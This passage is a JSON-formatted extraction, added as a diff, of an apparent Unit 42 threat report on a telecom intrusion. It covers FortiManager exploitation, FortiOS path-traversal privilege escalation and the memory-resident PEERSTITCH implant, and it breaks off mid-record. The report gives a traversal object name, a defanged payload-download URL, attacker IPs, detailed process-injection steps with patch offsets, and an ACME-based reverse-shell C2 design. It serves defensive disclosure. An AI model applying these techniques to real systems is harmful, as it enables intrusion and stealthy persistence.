@@ -1,0 +1,2276 @@
+{
+ "meta": {
+  "adapter": "generic_html",
+  "extractor": "threat_library_html_v6",
+  "site_names": [
+   "Unit 42"
+  ],
+  "source_url": "https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/",
+  "source_host": "unit42.paloaltonetworks.com",
+  "content_root": "main",
+  "scope_engine": "section_tree",
+  "scope_engine_version": "tl-scope-engine-section-tree-v1",
+  "section_tree_version": "tl-section-tree-v2",
+  "candidate_extraction_version": "tl-candidates-v29"
+ },
+ "title": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant",
+ "blocks": [
+  {
+   "id": "b001",
+   "page": null,
+   "text": "Threat Research Center",
+   "type": "list",
+   "section": null
+  },
+  {
+   "id": "b002",
+   "page": null,
+   "text": "Threat Research",
+   "type": "list",
+   "section": null
+  },
+  {
+   "id": "b003",
+   "page": null,
+   "text": "Malware",
+   "type": "list",
+   "section": null
+  },
+  {
+   "id": "b004",
+   "page": null,
+   "text": "Malware",
+   "type": "paragraph",
+   "section": null
+  },
+  {
+   "id": "b005",
+   "page": null,
+   "text": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant",
+   "type": "heading",
+   "level": 1,
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b006",
+   "page": null,
+   "text": "14",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b007",
+   "page": null,
+   "text": "min read",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b008",
+   "page": null,
+   "text": "Related Products",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b009",
+   "page": null,
+   "text": "Advanced DNS SecurityAdvanced IP DefenseAdvanced Threat PreventionAdvanced URL FilteringAdvanced WildFireCloud-Delivered Security ServicesCortexCortex XpanseIoT SecurityNext-Generation FirewallUnit 42 Incident Response",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b010",
+   "page": null,
+   "text": "By:",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b011",
+   "page": null,
+   "text": "Daniel Gott",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b012",
+   "page": null,
+   "text": "Shawn Westfall",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b013",
+   "page": null,
+   "text": "Published:",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b014",
+   "page": null,
+   "text": "October 14, 2026",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b015",
+   "page": null,
+   "text": "Categories:",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b016",
+   "page": null,
+   "text": "Malware",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b017",
+   "page": null,
+   "text": "Threat Research",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b018",
+   "page": null,
+   "text": "Tags:",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b019",
+   "page": null,
+   "text": "Apache",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b020",
+   "page": null,
+   "text": "CL-STA-0954",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b021",
+   "page": null,
+   "text": "Logging",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b022",
+   "page": null,
+   "text": "Network intrusion",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b023",
+   "page": null,
+   "text": "Network Sniffer",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b024",
+   "page": null,
+   "text": "Payload",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b025",
+   "page": null,
+   "text": "Reverse shells",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b026",
+   "page": null,
+   "text": "VPN",
+   "type": "list",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b027",
+   "page": null,
+   "text": "Share",
+   "type": "paragraph",
+   "section": "Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant"
+  },
+  {
+   "id": "b028",
+   "page": null,
+   "text": "Executive Summary",
+   "type": "heading",
+   "level": 2,
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b029",
+   "page": null,
+   "text": "Unit 42 investigated a multi-stage network intrusion against a telecommunications organization that occurred in September 2024, which we are tracking as cluster CL-STA-0954 (aka UNC5820). The attackers behind CL-STA-0954 achieved an initial compromise by exploiting CVE-2024-47575 against a centralized FortiManager appliance.",
+   "type": "paragraph",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b030",
+   "page": null,
+   "text": "From that single appliance, our observations are that the attackers exfiltrated an archive containing running configurations, cryptographic material and database files containing information about more than 500 managed FortiGate firewalls. Those firewalls protected the target's own infrastructure and the networks of its clients.",
+   "type": "paragraph",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b031",
+   "page": null,
+   "text": "Following the initial compromise, the attackers behind CL-STA-0954 demonstrated a complex level of tradecraft. Aspects of the post-exploitation activity overlap with intrusions attributed to suspected nation-state actors. Armed with the stolen information, the attackers:",
+   "type": "paragraph",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b032",
+   "page": null,
+   "text": "Maintained long-term access",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b033",
+   "page": null,
+   "text": "Intercepted network traffic",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b034",
+   "page": null,
+   "text": "Established VPN sessions",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b035",
+   "page": null,
+   "text": "Deployed backdoors",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b036",
+   "page": null,
+   "text": "Exploited a separate privilege-escalation vulnerability",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b037",
+   "page": null,
+   "text": "The attackers exploited another vulnerability, CVE-2025-61624, via FortiOS auto-script path traversal. This exploit facilitated the deployment of PEERSTITCH, a novel, memory-resident ARM64 malware.",
+   "type": "paragraph",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b038",
+   "page": null,
+   "text": "PEERSTITCH leaves no persistent binary on disk, opens no listening ports and initiates no outbound network connections. Instead, it communicates through traffic generated by legitimate processes on the infected host, which makes the malware resistant to conventional endpoint and network detection.",
+   "type": "paragraph",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b039",
+   "page": null,
+   "text": "The attackers also impersonated the FortiManager platform to pull from managed firewalls of other hosts in the targeted network.",
+   "type": "paragraph",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b040",
+   "page": null,
+   "text": "Palo Alto Networks customers are better protected from this activity through the following products and services:",
+   "type": "paragraph",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b041",
+   "page": null,
+   "text": "Advanced WildFire",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b042",
+   "page": null,
+   "text": "Advanced URL Filtering, Advanced DNS Security and Advanced IP Defense",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b043",
+   "page": null,
+   "text": "Next-Generation Firewall with the Advanced Threat Prevention",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b044",
+   "page": null,
+   "text": "Cortex Xpanse",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b045",
+   "page": null,
+   "text": "Device Security",
+   "type": "list",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b046",
+   "page": null,
+   "text": "If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.",
+   "type": "paragraph",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b047",
+   "page": null,
+   "text": "Related Unit 42 Topics | Vulnerability, Privilege Escalation, Linux",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "Related Unit 42 Topics",
+      "Vulnerability, Privilege Escalation, Linux"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": null
+   },
+   "layout": "table",
+   "section": "Executive Summary"
+  },
+  {
+   "id": "b048",
+   "page": null,
+   "text": "Overview of the Intrusion",
+   "type": "heading",
+   "level": 2,
+   "section": "Overview of the Intrusion"
+  },
+  {
+   "id": "b049",
+   "page": null,
+   "text": "We investigated a prolonged network intrusion against a telecommunications managed service provider. The attackers demonstrated proficiency in Fortinet appliance architecture, FortiOS internals and FortiOS management protocols.",
+   "type": "paragraph",
+   "section": "Overview of the Intrusion"
+  },
+  {
+   "id": "b050",
+   "page": null,
+   "text": "Our investigation spanned the provider's own environment. We did not examine the client networks whose firewalls the provider managed. The exposure described in this report is of configuration and credential material rather than confirmed intrusion into those networks. Figure 1 below shows a flowchart illustrating an overview of the intrusion.",
+   "type": "paragraph",
+   "section": "Overview of the Intrusion"
+  },
+  {
+   "id": "b051",
+   "page": null,
+   "text": "Figure 1. Overview of the intrusion.",
+   "type": "caption",
+   "section": "Overview of the Intrusion"
+  },
+  {
+   "id": "b052",
+   "page": null,
+   "text": "Initial Access and Network Configuration Theft (CVE-2024-47575)",
+   "type": "heading",
+   "level": 2,
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b053",
+   "page": null,
+   "text": "During the initial phase of the intrusion, the attackers exploited CVE-2024-47575 (referred to by external parties as FortiJump). The vulnerability allows an unauthenticated remote attacker to execute arbitrary commands via crafted requests to the FMG-Access (TCP port 541) management channel.",
+   "type": "paragraph",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b054",
+   "page": null,
+   "text": "During the exploitation, the attackers registered a rogue Virtual FortiGate appliance named localhost (serial number FMG-VMTM23017412) to the central FortiManager instance, originating from external attacker infrastructure (45.32.41[.]202, later modified to 198.199.122[.]22).",
+   "type": "paragraph",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b055",
+   "page": null,
+   "text": "Immediately following device registration, the attacker generated a configuration archive named .tm in the FortiManager file system, which they exfiltrated shortly thereafter. Analysis of this artifact revealed:",
+   "type": "paragraph",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b056",
+   "page": null,
+   "text": "The FortiManager appliance's own serial number and its management relationships to every enrolled device",
+   "type": "list",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b057",
+   "page": null,
+   "text": "Complete running configuration files for more than 500 managed FortiGate firewalls across internal infrastructure and client networks",
+   "type": "list",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b058",
+   "page": null,
+   "text": "Central management SQLite databases: global.db (containing administrative domains, global objects and policy packages) and revinfo.db (containing device revision metadata)",
+   "type": "list",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b059",
+   "page": null,
+   "text": "A flat text inventory listing more than 500 FortiGate serial numbers alongside their respective public IP addresses",
+   "type": "list",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b060",
+   "page": null,
+   "text": "Internal network topology maps, routing tables and interface configurations",
+   "type": "list",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b061",
+   "page": null,
+   "text": "Ciphertext administrative, local and SSL/VPN credentials",
+   "type": "list",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b062",
+   "page": null,
+   "text": "Encoded cryptographic trust material, including public certificates and private keys",
+   "type": "list",
+   "section": "Initial Access and Network Configuration Theft (CVE-2024-47575)"
+  },
+  {
+   "id": "b063",
+   "page": null,
+   "text": "Reconnaissance and Targeted Traffic Sniffing",
+   "type": "heading",
+   "level": 2,
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b064",
+   "page": null,
+   "text": "Following an extended dwell period, the attackers pivoted to active network reconnaissance. They used the compromised FortiManager device to push unauthorized sniffer configurations to multiple downstream managed FortiGate firewalls.",
+   "type": "paragraph",
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b065",
+   "page": null,
+   "text": "The packet captures targeted unencrypted HTTP traffic and 11 specific services over different TCP ports to intercept sensitive communications and map network perimeters. Table 1 below shows the characteristics of these services.",
+   "type": "paragraph",
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b066",
+   "page": null,
+   "text": "Port | Service Identifier | Target Protocol Purpose | Assessed Intent ¶ 3696 | Telnet Com Port Control | Remote administration | Cleartext credential interception ¶ 3697 | nw-license | License management | Internal communications capture ¶ 3698 | Sagectlpanel | Control panel | Cleartext credential interception ¶ 3699 | kpn-icw | Telecom service | Internal communications capture ¶ 3700 | lrs-paging | Paging and telemetry | Internal communications capture ¶ 3701 | netcelera | Network acceleration | Internal network topology mapping ¶ 3702 | ws-discovery | Web services discovery | Active host discovery ¶ 3703 | adobeserver-3 | Application backend | Internal service telemetry ¶ 3704 | adobeserver-4 | Application backend | Internal service telemetry ¶ 3705 | adobeserver-5 | Application backend | Internal service telemetry ¶ 3706 | rt-event | Real-time events | Event stream monitoring",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "Port",
+      "Service Identifier",
+      "Target Protocol Purpose",
+      "Assessed Intent"
+     ],
+     [
+      "3696",
+      "Telnet Com Port Control",
+      "Remote administration",
+      "Cleartext credential interception"
+     ],
+     [
+      "3697",
+      "nw-license",
+      "License management",
+      "Internal communications capture"
+     ],
+     [
+      "3698",
+      "Sagectlpanel",
+      "Control panel",
+      "Cleartext credential interception"
+     ],
+     [
+      "3699",
+      "kpn-icw",
+      "Telecom service",
+      "Internal communications capture"
+     ],
+     [
+      "3700",
+      "lrs-paging",
+      "Paging and telemetry",
+      "Internal communications capture"
+     ],
+     [
+      "3701",
+      "netcelera",
+      "Network acceleration",
+      "Internal network topology mapping"
+     ],
+     [
+      "3702",
+      "ws-discovery",
+      "Web services discovery",
+      "Active host discovery"
+     ],
+     [
+      "3703",
+      "adobeserver-3",
+      "Application backend",
+      "Internal service telemetry"
+     ],
+     [
+      "3704",
+      "adobeserver-4",
+      "Application backend",
+      "Internal service telemetry"
+     ],
+     [
+      "3705",
+      "adobeserver-5",
+      "Application backend",
+      "Internal service telemetry"
+     ],
+     [
+      "3706",
+      "rt-event",
+      "Real-time events",
+      "Event stream monitoring"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": null
+   },
+   "layout": "table",
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b067",
+   "page": null,
+   "text": "Table 1. Services the attackers used to intercept sensitive communications and map network perimeters.",
+   "type": "paragraph",
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b068",
+   "page": null,
+   "text": "In a subsequent phase of reconnaissance, attackers deployed additional packet-capture rules to core perimeter firewalls targeting:",
+   "type": "paragraph",
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b069",
+   "page": null,
+   "text": "UDP port 69 (TFTP): File, communications, firmware and configuration capture",
+   "type": "list",
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b070",
+   "page": null,
+   "text": "UDP ports 1812 and 1813 (RADIUS and RADIUS-Accounting): Network authentication sniffing",
+   "type": "list",
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b071",
+   "page": null,
+   "text": "TCP port 389 (LDAP): Active Directory query interception and directory enumeration",
+   "type": "list",
+   "section": "Reconnaissance and Targeted Traffic Sniffing"
+  },
+  {
+   "id": "b072",
+   "page": null,
+   "text": "Credential Decryption and Initial Re-Entry",
+   "type": "heading",
+   "level": 2,
+   "section": "Credential Decryption and Initial Re-Entry"
+  },
+  {
+   "id": "b073",
+   "page": null,
+   "text": "The exfiltrated FortiGate configurations contained sensitive credentials stored as reversible ciphertext. We confirmed that the credentials were recoverable by successfully brute-forcing administrative and SSL/VPN passwords from the exfiltrated configuration files.",
+   "type": "paragraph",
+   "section": "Credential Decryption and Initial Re-Entry"
+  },
+  {
+   "id": "b074",
+   "page": null,
+   "text": "Using legitimate credentials, the attackers established unauthorized FortiGate SSL/VPN sessions to perimeter firewalls from known external staging infrastructure (23.240.77[.]233 and 47.18.167[.]159). These sessions granted the attackers authenticated access into internal network-management segments.",
+   "type": "paragraph",
+   "section": "Credential Decryption and Initial Re-Entry"
+  },
+  {
+   "id": "b075",
+   "page": null,
+   "text": "Privilege Escalation: CVE-2025-61624",
+   "type": "heading",
+   "level": 2,
+   "section": "Privilege Escalation: CVE-2025-61624"
+  },
+  {
+   "id": "b076",
+   "page": null,
+   "text": "During the intrusion, the attackers exploited CVE-2025-61624 to escalate from FortiOS administrative access to root on the underlying firewall operating system. A FortiOS administrator, including a super_admin, operates within a restricted management command line with no shell access and no direct control over the appliance file system or its running processes. The daemons that implement FortiOS run as root beneath that interface.",
+   "type": "paragraph",
+   "section": "Privilege Escalation: CVE-2025-61624"
+  },
+  {
+   "id": "b077",
+   "page": null,
+   "text": "The vulnerability allows an authenticated administrative account to read and write arbitrary files as root via path traversal in the FortiOS CLI system.auto-script engine. The auto-script object name is not sanitized, allowing a name containing traversal sequences to place the script body outside the intended directory, at any file system location. The script executes with the privileges of the auto-script engine.",
+   "type": "paragraph",
+   "section": "Privilege Escalation: CVE-2025-61624"
+  },
+  {
+   "id": "b078",
+   "page": null,
+   "text": "The sanitized event below highlights the creation of the traversal object ../../../../setup used to drop the PEERSTITCH initial-stage loader shown below in Figure 2.",
+   "type": "paragraph",
+   "section": "Privilege Escalation: CVE-2025-61624"
+  },
+  {
+   "id": "b079",
+   "page": null,
+   "text": "Figure 2. Fortinet log capturing exploitation of CVE-2025-61624 to run the PEERSTITCH loader.",
+   "type": "caption",
+   "section": "Privilege Escalation: CVE-2025-61624"
+  },
+  {
+   "id": "b080",
+   "page": null,
+   "text": "Technical Analysis of the PEERSTITCH Implant",
+   "type": "heading",
+   "level": 2,
+   "section": "Technical Analysis of the PEERSTITCH Implant"
+  },
+  {
+   "id": "b081",
+   "page": null,
+   "text": "PEERSTITCH is a 64-bit Linux ARM64 executable written in C and statically linked against glibc. It acts as a one-shot process memory patching injector targeting two core FortiOS daemons:",
+   "type": "paragraph",
+   "section": "Technical Analysis of the PEERSTITCH Implant"
+  },
+  {
+   "id": "b082",
+   "page": null,
+   "text": "/bin/miglogd: The central system and traffic logging daemon",
+   "type": "list",
+   "section": "Technical Analysis of the PEERSTITCH Implant"
+  },
+  {
+   "id": "b083",
+   "page": null,
+   "text": "/bin/iked: The IKE/IPsec VPN service daemon handling cryptographic negotiation",
+   "type": "list",
+   "section": "Technical Analysis of the PEERSTITCH Implant"
+  },
+  {
+   "id": "b084",
+   "page": null,
+   "text": "Figure 3. Flowchart of PEERSTITCH activity.",
+   "type": "caption",
+   "section": "Technical Analysis of the PEERSTITCH Implant"
+  },
+  {
+   "id": "b085",
+   "page": null,
+   "text": "Figure 3 shows a flow chart of PEERSTITCH activity, which we will examine in greater detail.",
+   "type": "paragraph",
+   "section": "Technical Analysis of the PEERSTITCH Implant"
+  },
+  {
+   "id": "b086",
+   "page": null,
+   "text": "Delivery and Staging Chain",
+   "type": "heading",
+   "level": 3,
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b087",
+   "page": null,
+   "text": "1). Downloader initialization: Exploiting CVE-2025-61624, the attackers pushed ../../../../setup to a select number of firewalls",
+   "type": "paragraph",
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b088",
+   "page": null,
+   "text": "2). Payload retrieval: The script downloaded five files from hxxp[:]//23.240.77[.]233:8085/ into /data2/template/:",
+   "type": "paragraph",
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b089",
+   "page": null,
+   "text": "pM.js: Environment preparation script (self-deleting)",
+   "type": "list",
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b090",
+   "page": null,
+   "text": "a.js (saved as index.js): Emscripten JavaScript runtime module",
+   "type": "list",
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b091",
+   "page": null,
+   "text": "a.wasm (saved as index.wasm): Compiled WebAssembly binary module",
+   "type": "list",
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b092",
+   "page": null,
+   "text": "b.js (saved as ipssem.js): Deployment orchestrator script",
+   "type": "list",
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b093",
+   "page": null,
+   "text": "dd (saved as lldprx): Native ARM64 ELF binary injector (PEERSTITCH core)",
+   "type": "list",
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b094",
+   "page": null,
+   "text": "3). Execution: Following an execution delay, ipssem.js launched lldprx with arguments lldprx!index.js!index.wasm!ipssem.js!lldprx!yyyy!pM.js",
+   "type": "paragraph",
+   "section": "Delivery and Staging Chain"
+  },
+  {
+   "id": "b095",
+   "page": null,
+   "text": "Injector Execution and Process Parasitization",
+   "type": "heading",
+   "level": 3,
+   "section": "Injector Execution and Process Parasitization"
+  },
+  {
+   "id": "b096",
+   "page": null,
+   "text": "The lldprx binary performs a single-pass execution sequence:",
+   "type": "paragraph",
+   "section": "Injector Execution and Process Parasitization"
+  },
+  {
+   "id": "b097",
+   "page": null,
+   "text": "Process discovery: Iterates through /proc/, parses /proc/<pid>/cmdline and locates the process identifiers (PIDs) for /bin/miglogd and /bin/iked",
+   "type": "list",
+   "section": "Injector Execution and Process Parasitization"
+  },
+  {
+   "id": "b098",
+   "page": null,
+   "text": "Memory layout enumeration: Reads /proc/<pid>/maps to extract the base addresses and memory boundaries of both target daemons",
+   "type": "list",
+   "section": "Injector Execution and Process Parasitization"
+  },
+  {
+   "id": "b099",
+   "page": null,
+   "text": "Process attachment: Attaches to both running processes using ptrace(PTRACE_SEIZE, pid) and halts execution via PTRACE_INTERRUPT",
+   "type": "list",
+   "section": "Injector Execution and Process Parasitization"
+  },
+  {
+   "id": "b100",
+   "page": null,
+   "text": "Register state capture: Calls ptrace(PTRACE_GETREGSET, pid) to snapshot all ARM64 general-purpose registers (X0 through X30), the stack pointer (SP) and program counter (PC)",
+   "type": "list",
+   "section": "Injector Execution and Process Parasitization"
+  },
+  {
+   "id": "b101",
+   "page": null,
+   "text": "Dynamic shellcode construction: Generates an ARM64 bootstrap stub dynamically. The bootstrap executes an mmap syscall (X8 = 0xDE) requesting 0x4000 (16,384 bytes) of PROT_READ | PROT_WRITE | PROT_EXEC (RWX) memory mapped as MAP_PRIVATE | MAP_ANONYMOUS",
+   "type": "list",
+   "section": "Injector Execution and Process Parasitization"
+  },
+  {
+   "id": "b102",
+   "page": null,
+   "text": "Payload injection: Writes a 1,344-byte injection payload into the newly allocated RWX buffer via /proc/<pid>/mem",
+   "type": "list",
+   "section": "Injector Execution and Process Parasitization"
+  },
+  {
+   "id": "b103",
+   "page": null,
+   "text": "Covert IPC and Cross-Daemon Memory Sharing",
+   "type": "heading",
+   "level": 3,
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b104",
+   "page": null,
+   "text": "Instead of using network sockets or disk files, PEERSTITCH creates a covert, memory-resident communication bridge between /bin/miglogd and /bin/iked.",
+   "type": "paragraph",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b105",
+   "page": null,
+   "text": "Figure 4 shows a flowchart for PEERSTITCH network traffic.",
+   "type": "paragraph",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b106",
+   "page": null,
+   "text": "Figure 4. Flowchart for PEERSTITCH network traffic.",
+   "type": "caption",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b107",
+   "page": null,
+   "text": "Passive traffic monitoring: Inside both daemons, the hook code inspects data already passing through the process without redirecting packets. It evaluates string patterns using strstr() for two specific markers:",
+   "type": "list",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b108",
+   "page": null,
+   "text": "TCP port marker: 8550 (embedded within traffic data, not a listening port)",
+   "type": "list",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b109",
+   "page": null,
+   "text": "IP address marker: 169.254.0.1 (link-local identifier used for pattern matching)",
+   "type": "list",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b110",
+   "page": null,
+   "text": "Tag extraction and buffering: When a marker is identified, the hook extracts an associated session token or identifier (up to 31 bytes) and writes it into a 16-slot circular ring buffer at offset +0x0F0",
+   "type": "list",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b111",
+   "page": null,
+   "text": "Cross-process write: The hook iterates through its forwarding table at offset +0x400 (populated with the counterpart daemon's PID and buffer base address). It invokes open(), lseek() and write() on /proc/<counterpart_pid>/mem, writing the extracted tag directly into the other daemon's memory.",
+   "type": "list",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b112",
+   "page": null,
+   "text": "Conditional execution branching: When /bin/iked processes subsequent VPN sessions, its hook inspects its injection buffer. If a corresponding tag exists, the hook takes an alternate return branch (ADRP return path), bypassing default FortiOS security validations.",
+   "type": "list",
+   "section": "Covert IPC and Cross-Daemon Memory Sharing"
+  },
+  {
+   "id": "b113",
+   "page": null,
+   "text": "Memory Patching and Branch Path Modification",
+   "type": "heading",
+   "level": 3,
+   "section": "Memory Patching and Branch Path Modification"
+  },
+  {
+   "id": "b114",
+   "page": null,
+   "text": "To suppress tamper detection and alter default daemon routines, PEERSTITCH applies direct NOP patches (0xAA0003E0, corresponding to MOV X0, X0 on ARM64) to three static offsets within target process memory:",
+   "type": "paragraph",
+   "section": "Memory Patching and Branch Path Modification"
+  },
+  {
+   "id": "b115",
+   "page": null,
+   "text": "base + 0x106F7B8",
+   "type": "list",
+   "section": "Memory Patching and Branch Path Modification"
+  },
+  {
+   "id": "b116",
+   "page": null,
+   "text": "base + 0x1072E20",
+   "type": "list",
+   "section": "Memory Patching and Branch Path Modification"
+  },
+  {
+   "id": "b117",
+   "page": null,
+   "text": "base + 0x109A570",
+   "type": "list",
+   "section": "Memory Patching and Branch Path Modification"
+  },
+  {
+   "id": "b118",
+   "page": null,
+   "text": "A 20-byte trampoline patch is written to base + 0x135102C to redirect standard execution into the allocated RWX hook buffer. Figure 5 shows a visual memory layout of the 16 KB buffer used by the ARM64 PEERSTITCH payload.",
+   "type": "paragraph",
+   "section": "Memory Patching and Branch Path Modification"
+  },
+  {
+   "id": "b119",
+   "page": null,
+   "text": "Figure 5. A visual memory layout of the 16 KB buffer utilized by the ARM64 PEERSTITCH payload.",
+   "type": "caption",
+   "section": "Memory Patching and Branch Path Modification"
+  },
+  {
+   "id": "b120",
+   "page": null,
+   "text": "Apache mod_md ACME Reverse Shell Command and Control",
+   "type": "heading",
+   "level": 3,
+   "section": "Apache mod_md ACME Reverse Shell Command and Control"
+  },
+  {
+   "id": "b121",
+   "page": null,
+   "text": "Alongside PEERSTITCH, the attackers established a command and control channel by weaponizing the native Apache mod_md (Managing Domains) module on FortiGate firewalls. This module uses the Automated Certificate Management Environment (ACME) protocol.",
+   "type": "paragraph",
+   "section": "Apache mod_md ACME Reverse Shell Command and Control"
+  },
+  {
+   "id": "b122",
+   "page": null,
+   "text": "The attackers pushed an auto-script object to create ../../tmp/apache2/conf/md-acme.conf, as shown below in Figure 6.",
+   "type": "paragraph",
+   "section": "Apache mod_md ACME Reverse Shell Command and Control"
+  },
+  {
+   "id": "b123",
+   "page": null,
+   "text": "Figure 6. Fortinet log capturing exploitation of CVE-2025-61624 to run md-acme.conf.",
+   "type": "caption",
+   "section": "Apache mod_md ACME Reverse Shell Command and Control"
+  },
+  {
+   "id": "b124",
+   "page": null,
+   "text": "Weaponization Mechanics",
+   "type": "heading",
+   "level": 3,
+   "section": "Weaponization Mechanics"
+  },
+  {
+   "id": "b125",
+   "page": null,
+   "text": "1). Rogue certificate authority initialization: The account.json state file demonstrates the initial registration with the attacker's ACME server, explicitly routing ACME directory requests to external infrastructure",
+   "type": "paragraph",
+   "section": "Weaponization Mechanics"
+  },
+  {
